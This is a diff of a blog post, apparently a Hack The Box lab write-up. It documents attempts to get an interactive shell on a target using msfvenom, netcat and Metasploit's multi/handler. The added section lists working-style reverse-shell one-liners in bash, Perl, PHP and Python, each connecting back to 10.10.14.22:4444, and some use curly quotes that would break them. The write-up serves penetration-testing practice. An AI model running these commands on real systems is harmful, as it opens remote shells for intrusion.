@@ -265,7 +265,8 @@ We then click on generate to make the server execute the msfvenom command and ch
 ![Catch rev shell]({{https://jsom1.github.io/}}/_images/htb_sk_shell.png)
 </div>
 
-We have a shell, but we can't execute anything. I also tried with a bind shell, I can connect to it but can't execute any command either. Let's try with Metasploit's multi/handler. We first set the options correctly:
+We have a shell, but we can't execute anything. In the image above, I executed some commands to go from a non-interactive shell to an interactive one, but it didn't work (from the post https://forum.hackthebox.eu/discussion/142/obtaining-a-fully-interactive-shell/p1). The same happens with a bind shell. I also tried to specify /bin/bash in the payload's command (*sudo nc -nv 10.10.14.22 4444 -e /bin/bash*), but in that case we don't even catch a shell back.\\
+Let's try with Metasploit's multi/handler (we saw at the end of the script that the command executed by the server is *msfvenom -x evil.apk -p android/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -o /dev/null*), as it might be better at catching specific payload shells. We set up the different options and select an android/meterpreter/reverse_tcp payload:
 
 <div class="img_container">
 ![multi handler]({{https://jsom1.github.io/}}/_images/htb_sk_multihandler.png)
@@ -277,7 +278,31 @@ We see it started a listener and we're ready to catch a shell. We reupload the f
 ![multi handler fail]({{https://jsom1.github.io/}}/_images/htb_sk_multihandlerfail.png)
 </div>
 
-We can use the command *shell* to try to get a better shell, but it didn't work here... Note that in the image above, we didn't specify a payload. Generally, we have a higher chance of success if we do so. We can see the available payloads with *show payloads*. In our case, we know from the web site that it generates a reverse TCP meterpreter shell. We also know the target is running Linux, but not the precise architecture. I tried to set the payload to *linux/x86/meterpreter/reverse_tcp* and *linux/x64/meterpreter/reverse_tcp*, but none of those worked.
+As we did manually earlier with *python -c 'import pty;pty.spawn("/bin/bash");'*, we can use the command *shell* to make multi/handler automatically try to pop various shells. Sadly, it didn't work here either.
+So far both netcat and metasploit catch a shell back, but we can't do anything... We can probably use another payload to get a shell. Sometimes the target doesn't have netcat (even though our target should since it connected back to us). In this case, we can use other shells. There are several others such as:
+
+- Bash reverse shell:
+````
+bash -i>& /dev/tcp/10.10.14.22/4444 0>&1
+````
+- Perl reverse shell: 
+````
+perl -e ‘use Socket;$i=”10.10.14.22″;$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(“tcp”));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,”>&S”);open(STDOUT,”>&S”);open(STDERR,”>&S”);exec(“/bin/sh -i”);};’
+`````
+- PHP reverse shell (PHP is often present on web servers): 
+`````
+php -r ‘$sock=fsockopen(“10.10.14.22”,4444);exec(“/bin/sh -i <&3 >&3 2>&3”);’
+`````
+- Python reverse shell:
+````
+python -c ‘import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((“10.10.14.22”,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([“/bin/sh”,”-i”]);’
+````
+
+I tried all of them and nothing works.
+
+
+
+
 
 
 
